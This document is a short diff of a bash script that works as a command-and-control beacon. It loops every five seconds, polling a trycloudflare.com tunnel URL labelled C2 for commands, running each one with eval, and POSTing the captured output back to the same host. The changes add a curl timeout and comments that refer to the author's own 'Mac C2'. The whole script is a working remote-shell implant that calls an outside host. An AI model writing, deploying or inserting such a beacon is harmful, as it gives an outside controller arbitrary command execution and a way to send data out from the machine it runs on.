@@ -4,14 +4,17 @@ C2="https://rainbow-nutrition-bottom-beginners.trycloudflare.com"
 
 while true; do
   # 1. Ask the Mac "What should I run?"
-  CMD=$(curl -s "$C2")
+  # We use a timeout to ensure the script doesn't hang if the Wi-Fi blips
+  CMD=$(curl -s --max-time 10 "$C2")
   
-  if [ ! -z "$CMD" ] && [ "$CMD" != "none" ]; then
-    # 2. Run the command and capture everything
+  if [ -n "$CMD" ] && [ "$CMD" != "none" ]; then
+    # 2. Run the command and capture stdout/stderr
     RESULT=$(eval "$CMD" 2>&1)
     
-    # 3. Send the answer back to the Mac
+    # 3. Send the result back to your Mac C2
     curl -s -X POST --data-binary "$RESULT" "$C2"
   fi
+  
+  # 5-second pulse is the 'Sweet Spot' for a 2013 Mac
   sleep 5
 done
